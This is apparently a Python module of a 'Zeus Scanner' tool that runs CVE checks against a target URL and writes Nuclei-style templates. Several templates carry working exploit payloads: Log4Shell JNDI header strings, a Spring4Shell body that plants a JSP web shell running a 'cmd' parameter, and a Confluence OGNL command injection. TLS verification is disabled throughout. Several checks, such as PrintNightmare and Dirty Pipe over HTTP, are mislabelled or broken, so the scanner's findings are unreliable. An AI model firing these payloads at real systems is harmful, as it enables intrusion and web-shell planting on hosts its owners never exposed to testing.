#!/usr/bin/env python3

import re
import json
import time
import requests
import hashlib
from datetime import datetime
from typing import Dict, List, Any
from urllib.parse import urlparse, urljoin

try:
    from colorama import init, Fore, Style
    init(autoreset=True)
except ImportError:
    class Fore:
        RED = '\033[31m'
        GREEN = '\033[32m'
        YELLOW = '\033[33m'
        BLUE = '\033[34m'
        MAGENTA = '\033[35m'
        CYAN = '\033[36m'
        WHITE = '\033[37m'
        RESET = '\033[0m'
    
    class Style:
        BRIGHT = '\033[1m'
        RESET_ALL = '\033[0m'

import lib.core.settings


class CVEDetector:
    """
    Advanced CVE detection engine with Nuclei-style template generation
    """
    
    def __init__(self, verbose=False, user_agent=None, proxy=None):
        self.verbose = verbose
        self.user_agent = user_agent or lib.core.settings.DEFAULT_USER_AGENT
        self.proxy = proxy
        self.session = requests.Session()
        self.session.headers.update({'User-Agent': self.user_agent})
        
        # Comprehensive SSL verification disable for pentesting
        self.session.verify = False
        
        # Disable SSL warnings globally
        import urllib3
        urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
        urllib3.disable_warnings(urllib3.exceptions.ConnectTimeoutError)
        urllib3.disable_warnings(urllib3.exceptions.ReadTimeoutError)
        
        # Configure session with SSL bypass and timeout
        import ssl
        self.session.trust_env = False
        
        # Set timeout defaults
        self.timeout = 30
        
        # Additional SSL context configuration
        try:
            import ssl
            ssl._create_default_https_context = ssl._create_unverified_context
            # Create custom SSL adapter
            from requests.adapters import HTTPAdapter
            from urllib3.util.ssl_ import create_urllib3_context
            
            class SSLAdapter(HTTPAdapter):
                def init_poolmanager(self, *args, **kwargs):
                    ctx = create_urllib3_context()
                    ctx.check_hostname = False
                    ctx.verify_mode = ssl.CERT_NONE
                    kwargs['ssl_context'] = ctx
                    return super().init_poolmanager(*args, **kwargs)
            
            self.session.mount('https://', SSLAdapter())
            self.session.mount('http://', HTTPAdapter())
            
        except Exception as e:
            if self.verbose:
                print(f"SSL configuration warning: {e}")
            pass
        
        # CVE templates database
        self.cve_templates = self._load_cve_templates()
        self.detected_cves = []
        
    def _load_cve_templates(self):
        """
        Load comprehensive CVE detection templates
        """
        return {
            # Web Application CVEs
            'CVE-2021-44228': {  # Log4Shell
                'name': 'Apache Log4j2 Remote Code Execution',
                'severity': 'critical',
                'description': 'Apache Log4j2 JNDI features do not protect against attacker controlled LDAP',
                'tags': ['rce', 'log4j', 'jndi', 'ldap'],
                'requests': [
                    {
                        'method': 'GET',
                        'path': '/',
                        'headers': {
                            'User-Agent': '${jndi:ldap://{{interactsh-url}}/a}',
                            'X-Forwarded-For': '${jndi:ldap://{{interactsh-url}}/a}',
                            'X-Real-IP': '${jndi:ldap://{{interactsh-url}}/a}',
                            'Referer': '${jndi:ldap://{{interactsh-url}}/a}'
                        }
                    }
                ],
                'matchers': [
                    {'type': 'word', 'words': ['ldap', 'jndi'], 'condition': 'and'},
                    {'type': 'status', 'status': [200, 500]}
                ]
            },
            
            'CVE-2022-22965': {  # Spring4Shell
                'name': 'Spring Framework RCE via Data Binding on JDK 9+',
                'severity': 'critical',
                'description': 'Spring MVC or Spring WebFlux application running on JDK 9+ may be vulnerable to remote code execution',
                'tags': ['rce', 'spring', 'java'],
                'requests': [
                    {
                        'method': 'POST',
                        'path': '/',
                        'headers': {'Content-Type': 'application/x-www-form-urlencoded'},
                        'body': 'class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bc2%7Di%20if(%22j%22.equals(request.getParameter(%22pwd%22)))%7B%20java.io.InputStream%20in%20%3D%20%25%7Bc1%7Di.getRuntime().exec(request.getParameter(%22cmd%22)).getInputStream()%3B%20int%20a%20%3D%20-1%3B%20byte%5B%5D%20b%20%3D%20new%20byte%5B2048%5D%3B%20while((a%3Din.read(b))!%3D-1)%7B%20out.println(new%20String(b))%3B%20%7D%20%7D%20%25%7Bsuffix%7Di&class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp'
                    }
                ],
                'matchers': [
                    {'type': 'status', 'status': [200]},
                    {'type': 'word', 'words': ['tomcat', 'spring'], 'condition': 'or'}
                ]
            },
            
            'CVE-2021-34527': {  # PrintNightmare
                'name': 'Windows Print Spooler Remote Code Execution',
                'severity': 'critical',
                'description': 'Windows Print Spooler service improperly performs privileged file operations',
                'tags': ['rce', 'windows', 'print-spooler'],
                'requests': [
                    {
                        'method': 'GET',
                        'path': '/printers/',
                        'headers': {}
                    }
                ],
                'matchers': [
                    {'type': 'word', 'words': ['printer', 'spooler'], 'condition': 'or'},
                    {'type': 'status', 'status': [200]}
                ]
            },
            
            'CVE-2022-0543': {  # Redis Lua Sandbox Escape
                'name': 'Redis Lua Sandbox Escape',
                'severity': 'critical',
                'description': 'Redis Lua debugger protocol mishandles the eval command',
                'tags': ['rce', 'redis', 'lua'],
                'requests': [
                    {
                        'method': 'POST',
                        'path': '/',
                        'body': '*1\r\n$4\r\neval\r\n'
                    }
                ],
                'matchers': [
                    {'type': 'word', 'words': ['redis', 'lua'], 'condition': 'or'}
                ]
            },
            
            'CVE-2021-26855': {  # Microsoft Exchange Server SSRF
                'name': 'Microsoft Exchange Server SSRF',
                'severity': 'critical',
                'description': 'Microsoft Exchange Server Remote Code Execution Vulnerability',
                'tags': ['ssrf', 'exchange', 'microsoft'],
                'requests': [
                    {
                        'method': 'POST',
                        'path': '/owa/auth/x.js',
                        'headers': {'Cookie': 'X-AnonResource=true'},
                        'body': 'test-exchange-payload'
                    }
                ],
                'matchers': [
                    {'type': 'word', 'words': ['exchange', 'autodiscover'], 'condition': 'and'},
                    {'type': 'status', 'status': [200, 302]}
                ]
            },
            
            'CVE-2022-30190': {  # Follina
                'name': 'Microsoft Windows Support Diagnostic Tool RCE',
                'severity': 'high',
                'description': 'Microsoft Windows Support Diagnostic Tool (MSDT) Remote Code Execution Vulnerability',
                'tags': ['rce', 'windows', 'msdt'],
                'requests': [
                    {
                        'method': 'GET',
                        'path': '/',
                        'headers': {'User-Agent': 'msdt-payload-test'}
                    }
                ],
                'matchers': [
                    {'type': 'word', 'words': ['msdt', 'diagnostic'], 'condition': 'or'}
                ]
            },
            
            # CMS-specific CVEs
            'CVE-2022-21661': {  # WordPress Core
                'name': 'WordPress Core SQL Injection',
                'severity': 'high',
                'description': 'WordPress Core is vulnerable to SQL Injection via WP_Query',
                'tags': ['sqli', 'wordpress', 'cms'],
                'requests': [
                    {
                        'method': 'GET',
                        'path': '/wp-json/wp/v2/users/',
                        'headers': {}
                    }
                ],
                'matchers': [
                    {'type': 'word', 'words': ['wp-json', 'wordpress'], 'condition': 'or'},
                    {'type': 'status', 'status': [200]}
                ]
            },
            
            'CVE-2023-23752': {  # Joomla Information Disclosure
                'name': 'Joomla Unauthenticated Information Disclosure',
                'severity': 'medium',
                'description': 'Joomla CMS vulnerable to unauthenticated information disclosure',
                'tags': ['info-disclosure', 'joomla', 'cms'],
                'requests': [
                    {
                        'method': 'GET',
                        'path': '/api/index.php/v1/config/application?public=true',
                        'headers': {}
                    }
                ],
                'matchers': [
                    {'type': 'word', 'words': ['joomla', 'config'], 'condition': 'and'},
                    {'type': 'status', 'status': [200]}
                ]
            },
            
            # Network/Infrastructure CVEs
            'CVE-2022-26134': {  # Atlassian Confluence RCE
                'name': 'Atlassian Confluence Remote Code Execution',
                'severity': 'critical',
                'description': 'Atlassian Confluence Server and Data Center allow remote code execution',
                'tags': ['rce', 'confluence', 'atlassian'],
                'requests': [
                    {
                        'method': 'GET',
                        'path': '/%24%7B%28%23a%3D%40org.apache.commons.io.IOUtils%40toString%28%40java.lang.Runtime%40getRuntime%28%29.exec%28%22whoami%22%29.getInputStream%28%29%2C%22utf-8%22%29%29.%28%40com.opensymphony.webwork.ServletActionContext%40getResponse%28%29.setHeader%28%22X-Cmd-Response%22%2C%23a%29%29%7D/',
                        'headers': {}
                    }
                ],
                'matchers': [
                    {'type': 'word', 'words': ['confluence', 'atlassian'], 'condition': 'or'},
                    {'type': 'header', 'name': 'X-Cmd-Response'}
                ]
            },
            
            'CVE-2021-44515': {  # Zoho ManageEngine
                'name': 'Zoho ManageEngine ADSelfService Plus Authentication Bypass',
                'severity': 'critical',
                'description': 'Zoho ManageEngine ADSelfService Plus build before 6114 allows authentication bypass',
                'tags': ['auth-bypass', 'zoho', 'manageengine'],
                'requests': [
                    {
                        'method': 'GET',
                        'path': '/help/admin-guide/reports/index.html',
                        'headers': {}
                    }
                ],
                'matchers': [
                    {'type': 'word', 'words': ['manageengine', 'zoho'], 'condition': 'or'},
                    {'type': 'status', 'status': [200]}
                ]
            },
            
            # File Upload CVEs
            'CVE-2022-22954': {  # VMware Workspace ONE
                'name': 'VMware Workspace ONE Access Server-Side Template Injection',
                'severity': 'critical',
                'description': 'VMware Workspace ONE Access contains a server-side template injection vulnerability',
                'tags': ['ssti', 'vmware', 'rce'],
                'requests': [
                    {
                        'method': 'GET',
                        'path': '/catalog-portal/ui/oauth/verify?error=&deviceUdid=${{7*7}}',
                        'headers': {}
                    }
                ],
                'matchers': [
                    {'type': 'word', 'words': ['49', 'workspace'], 'condition': 'or'},
                    {'type': 'status', 'status': [200]}
                ]
            },
            
            # API-specific CVEs
            'CVE-2022-0847': {  # Dirty Pipe
                'name': 'Linux Kernel Privilege Escalation',
                'severity': 'high',
                'description': 'Linux kernel allows local privilege escalation',
                'tags': ['privesc', 'linux', 'kernel'],
                'requests': [
                    {
                        'method': 'GET',
                        'path': '/proc/version',
                        'headers': {}
                    }
                ],
                'matchers': [
                    {'type': 'word', 'words': ['linux', 'kernel'], 'condition': 'and'},
                    {'type': 'status', 'status': [200]}
                ]
            },
            
            # Database CVEs
            'CVE-2023-2976': {  # MongoDB Server
                'name': 'MongoDB Server Improper Authentication',
                'severity': 'high',
                'description': 'MongoDB Server allows authentication bypass',
                'tags': ['auth-bypass', 'mongodb', 'database'],
                'requests': [
                    {
                        'method': 'GET',
                        'path': '/admin',
                        'headers': {}
                    }
                ],
                'matchers': [
                    {'type': 'word', 'words': ['mongodb', 'admin'], 'condition': 'and'}
                ]
            },
            
            # Container CVEs
            'CVE-2022-0492': {  # Container Escape
                'name': 'Linux Kernel Container Escape',
                'severity': 'high',
                'description': 'Linux kernel allows container escape via cgroup_release_agent',
                'tags': ['container-escape', 'linux', 'cgroup'],
                'requests': [
                    {
                        'method': 'GET',
                        'path': '/proc/1/cgroup',
                        'headers': {}
                    }
                ],
                'matchers': [
                    {'type': 'word', 'words': ['docker', 'cgroup'], 'condition': 'or'}
                ]
            }
        }
    
    def detect_cves(self, target_url, discovered_urls=None):
        """
        Detect CVEs against target and discovered URLs
        """
        print(f"\n{Fore.MAGENTA}{Style.BRIGHT}Zeus CVE Detector Started{Style.RESET_ALL}")
        print(f"{Fore.BLUE}Target: {Fore.WHITE}{target_url}{Style.RESET_ALL}")
        print(f"{Fore.BLUE}CVE Templates: {Fore.WHITE}{len(self.cve_templates)}{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}{'='*80}{Style.RESET_ALL}\n")
        
        urls_to_test = [target_url]
        if discovered_urls:
            urls_to_test.extend(discovered_urls[:10])  # Limit to first 10 discovered URLs
        
        detected_cves = []
        
        for url in urls_to_test:
            for cve_id, template in self.cve_templates.items():
                try:
                    print(f"{Fore.CYAN}[CVE] Testing {cve_id} on {url}{Style.RESET_ALL}")
                    
                    cve_result = self._test_cve_template(url, cve_id, template)
                    if cve_result:
                        detected_cves.append(cve_result)
                        
                        severity_color = (Fore.RED if template['severity'] == 'critical' 
                                        else Fore.YELLOW if template['severity'] == 'high' 
                                        else Fore.GREEN)
                        
                        print(f"{severity_color}[DETECTED] {cve_id} - {template['name']}{Style.RESET_ALL}")
                    
                    time.sleep(0.3)  # Slightly longer delay for better stability
                    
                except KeyboardInterrupt:
                    print(f"{Fore.YELLOW}[INTERRUPTED] CVE scan interrupted by user{Style.RESET_ALL}")
                    break
                except Exception as e:
                    if self.verbose:
                        print(f"{Fore.YELLOW}CVE test error for {cve_id}: {e}{Style.RESET_ALL}")
                    continue
        
        self.detected_cves = detected_cves
        return detected_cves
    
    def _test_cve_template(self, base_url, cve_id, template):
        """
        Test a specific CVE template against a URL
        """
        for request_template in template.get('requests', []):
            try:
                # Build request URL
                path = request_template.get('path', '/')
                test_url = urljoin(base_url, path)
                
                # Prepare request parameters
                method = request_template.get('method', 'GET').upper()
                headers = request_template.get('headers', {})
                body = request_template.get('body', '')
                
                # Replace placeholders
                test_url = test_url.replace('{{Hostname}}', urlparse(base_url).netloc)
                if body:
                    body = body.replace('{{Hostname}}', urlparse(base_url).netloc)
                
                # Make request with comprehensive SSL bypass
                try:
                    # Create a new session with SSL disabled for each request
                    request_session = requests.Session()
                    request_session.verify = False
                    request_session.headers.update({'User-Agent': self.user_agent})
                    
                    if method == 'GET':
                        response = request_session.get(test_url, headers=headers, timeout=15, verify=False, allow_redirects=True)
                    elif method == 'POST':
                        response = request_session.post(test_url, headers=headers, data=body, timeout=15, verify=False, allow_redirects=True)
                    else:
                        continue
                        
                except (requests.exceptions.SSLError, Exception) as e:
                    if "SSL" in str(e) or "certificate" in str(e).lower():
                        if self.verbose:
                            print(f"SSL certificate verification failed for {cve_id} - continuing without verification")
                        # Retry with explicit SSL bypass
                        try:
                            if method == 'GET':
                                response = requests.get(test_url, headers=headers, timeout=15, verify=False, allow_redirects=True)
                            elif method == 'POST':
                                response = requests.post(test_url, headers=headers, data=body, timeout=15, verify=False, allow_redirects=True)
                            else:
                                continue
                        except Exception as retry_e:
                            if self.verbose:
                                print(f"Final request retry failed for {cve_id}: {retry_e}")
                            continue
                    else:
                        if self.verbose:
                            print(f"Request error for {cve_id}: {e}")
                        continue
                except requests.exceptions.ConnectionError as e:
                    if self.verbose:
                        print(f"{Fore.YELLOW}Connection error for {cve_id}: {e}{Style.RESET_ALL}")
                    continue
                except requests.exceptions.Timeout as e:
                    if self.verbose:
                        print(f"{Fore.YELLOW}Timeout error for {cve_id}: {e}{Style.RESET_ALL}")
                    continue
                
                # Check matchers
                if self._check_matchers(response, template.get('matchers', [])):
                    return {
                        'cve_id': cve_id,
                        'name': template['name'],
                        'severity': template['severity'],
                        'description': template['description'],
                        'tags': template['tags'],
                        'url': test_url,
                        'method': method,
                        'status_code': response.status_code,
                        'response_length': len(response.text),
                        'timestamp': time.time(),
                        'evidence': {
                            'request': {
                                'url': test_url,
                                'method': method,
                                'headers': headers,
                                'body': body
                            },
                            'response': {
                                'status': response.status_code,
                                'headers': dict(response.headers),
                                'body_snippet': response.text[:500]
                            }
                        }
                    }
                    
            except Exception as e:
                if self.verbose:
                    print(f"{Fore.YELLOW}Request error for {cve_id}: {e}{Style.RESET_ALL}")
                continue
        
        return None
    
    def _check_matchers(self, response, matchers):
        """
        Check if response matches CVE detection criteria
        """
        for matcher in matchers:
            matcher_type = matcher.get('type', 'word')
            
            if matcher_type == 'word':
                words = matcher.get('words', [])
                condition = matcher.get('condition', 'or')
                
                matches = []
                for word in words:
                    if word.lower() in response.text.lower():
                        matches.append(True)
                    else:
                        matches.append(False)
                
                if condition == 'and':
                    if not all(matches):
                        return False
                elif condition == 'or':
                    if not any(matches):
                        return False
            
            elif matcher_type == 'status':
                allowed_status = matcher.get('status', [200])
                if response.status_code not in allowed_status:
                    return False
            
            elif matcher_type == 'header':
                header_name = matcher.get('name', '')
                if header_name not in response.headers:
                    return False
        
        return True
    
    def generate_nuclei_templates(self, output_dir=None):
        """
        Generate Nuclei-style YAML templates from detected CVEs
        """
        if not output_dir:
            output_dir = f"{lib.core.settings.os.getcwd()}/templates"
        
        lib.core.settings.create_dir(output_dir)
        
        print(f"\n{Fore.MAGENTA}Generating Nuclei Templates{Style.RESET_ALL}")
        print(f"{Fore.BLUE}Output Directory: {Fore.WHITE}{output_dir}{Style.RESET_ALL}")
        
        generated_templates = []
        
        for detected_cve in self.detected_cves:
            template_content = self._create_nuclei_template(detected_cve)
            template_filename = f"{detected_cve['cve_id'].lower()}.yaml"
            template_path = f"{output_dir}/{template_filename}"
            
            try:
                with open(template_path, 'w') as f:
                    f.write(template_content)
                
                generated_templates.append({
                    'cve_id': detected_cve['cve_id'],
                    'template_path': template_path,
                    'severity': detected_cve['severity']
                })
                
                print(f"{Fore.GREEN}[TEMPLATE] Generated {template_filename}{Style.RESET_ALL}")
                
            except Exception as e:
                print(f"{Fore.RED}Error generating template for {detected_cve['cve_id']}: {e}{Style.RESET_ALL}")
        
        # Generate master template file
        self._generate_master_template(output_dir, generated_templates)
        
        return generated_templates
    
    def _create_nuclei_template(self, cve_data):
        """
        Create Nuclei-style YAML template from CVE data
        """
        template = f"""id: {cve_data['cve_id'].lower()}

info:
  name: {cve_data['name']}
  author: zeus-scanner-ai
  severity: {cve_data['severity']}
  description: {cve_data['description']}
  reference:
    - https://cve.mitre.org/cgi-bin/cvename.cgi?name={cve_data['cve_id']}
    - https://nvd.nist.gov/vuln/detail/{cve_data['cve_id']}
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: {self._calculate_cvss_score(cve_data['severity'])}
    cve-id: {cve_data['cve_id']}
  tags: {','.join(cve_data['tags'])}

http:
  - method: {cve_data['evidence']['request']['method']}
    path:
      - "{{{{BaseURL}}}}{self._extract_path(cve_data['url'])}"
    
    headers:"""
        
        # Add headers
        for header_name, header_value in cve_data['evidence']['request']['headers'].items():
            template += f"\n      {header_name}: \"{header_value}\""
        
        # Add body if present
        if cve_data['evidence']['request']['body']:
            template += f"\n    \n    body: |\n      {cve_data['evidence']['request']['body']}"
        
        # Add matchers
        template += f"""

    matchers-condition: and
    matchers:
      - type: status
        status:
          - {cve_data['status_code']}
      
      - type: word
        words:
          - "{cve_data['cve_id']}"
        part: body
        condition: or

    extractors:
      - type: regex
        name: vulnerability_evidence
        regex:
          - '([a-zA-Z0-9]+)'
        part: body
        group: 1

# Generated by Zeus Scanner AI Engine
# Timestamp: {datetime.now().isoformat()}
# Evidence URL: {cve_data['url']}
# Detection Method: AI Pattern Matching
"""
        
        return template
    
    def _extract_path(self, url):
        """
        Extract path from full URL
        """
        parsed = urlparse(url)
        path = parsed.path
        if parsed.query:
            path += f"?{parsed.query}"
        return path if path else "/"
    
    def _calculate_cvss_score(self, severity):
        """
        Calculate approximate CVSS score based on severity
        """
        severity_scores = {
            'critical': 9.8,
            'high': 8.1,
            'medium': 5.4,
            'low': 3.1,
            'info': 0.0
        }
        return severity_scores.get(severity.lower(), 5.0)
    
    def _generate_master_template(self, output_dir, generated_templates):
        """
        Generate master template file with all detected CVEs
        """
        master_content = f"""# Zeus Scanner AI - Master CVE Template Collection
# Generated: {datetime.now().isoformat()}
# Total CVEs Detected: {len(generated_templates)}

id: zeus-ai-cve-collection

info:
  name: Zeus AI CVE Collection
  author: zeus-scanner-ai
  severity: info
  description: Master collection of CVEs detected by Zeus Scanner AI Engine
  tags: cve,collection,zeus-ai

variables:
  target_url: "{{{{BaseURL}}}}"

http:"""
        
        for i, template in enumerate(generated_templates):
            master_content += f"""
  - method: GET
    path:
      - "{{{{BaseURL}}}}/"
    
    matchers:
      - type: word
        words:
          - "{template['cve_id']}"
        condition: and
        
    # CVE: {template['cve_id']}
    # Severity: {template['severity']}
    # Template: {template['template_path']}
"""
        
        master_path = f"{output_dir}/zeus-ai-master-collection.yaml"
        with open(master_path, 'w') as f:
            f.write(master_content)
        
        print(f"{Fore.CYAN}[MASTER] Generated zeus-ai-master-collection.yaml{Style.RESET_ALL}")
    
    def generate_cve_report(self):
        """
        Generate comprehensive CVE detection report
        """
        if not self.detected_cves:
            return {'status': 'No CVEs detected'}
        
        # Categorize by severity
        severity_breakdown = {'critical': 0, 'high': 0, 'medium': 0, 'low': 0}
        for cve in self.detected_cves:
            severity = cve.get('severity', 'low')
            severity_breakdown[severity] = severity_breakdown.get(severity, 0) + 1
        
        # Generate report
        report = {
            'detection_summary': {
                'total_cves_detected': len(self.detected_cves),
                'severity_breakdown': severity_breakdown,
                'detection_timestamp': time.time(),
                'detection_date': datetime.now().isoformat()
            },
            'detected_cves': self.detected_cves,
            'critical_findings': [cve for cve in self.detected_cves if cve.get('severity') == 'critical'],
            'high_priority': [cve for cve in self.detected_cves if cve.get('severity') in ['critical', 'high']],
            'recommendations': self._generate_cve_recommendations(),
            'nuclei_templates': f"Generated {len(self.detected_cves)} Nuclei templates"
        }
        
        return report
    
    def _generate_cve_recommendations(self):
        """
        Generate recommendations based on detected CVEs
        """
        recommendations = {
            'immediate_actions': [],
            'patch_management': [],
            'security_controls': [],
            'monitoring': []
        }
        
        critical_cves = [cve for cve in self.detected_cves if cve.get('severity') == 'critical']
        high_cves = [cve for cve in self.detected_cves if cve.get('severity') == 'high']
        
        if critical_cves:
            recommendations['immediate_actions'].extend([
                f"Immediately patch {len(critical_cves)} critical CVEs",
                "Activate incident response procedures",
                "Isolate affected systems if possible",
                "Notify security team and stakeholders"
            ])
        
        if high_cves:
            recommendations['immediate_actions'].extend([
                f"Prioritize patching {len(high_cves)} high-severity CVEs",
                "Review and update security policies"
            ])
        
        # Add specific recommendations based on CVE types
        cve_tags = set()
        for cve in self.detected_cves:
            cve_tags.update(cve.get('tags', []))
        
        if 'rce' in cve_tags:
            recommendations['security_controls'].append("Deploy application firewalls and intrusion prevention systems")
        
        if 'sqli' in cve_tags:
            recommendations['security_controls'].append("Implement database activity monitoring and query validation")
        
        if 'xss' in cve_tags:
            recommendations['security_controls'].append("Deploy Content Security Policy and input validation")
        
        return recommendations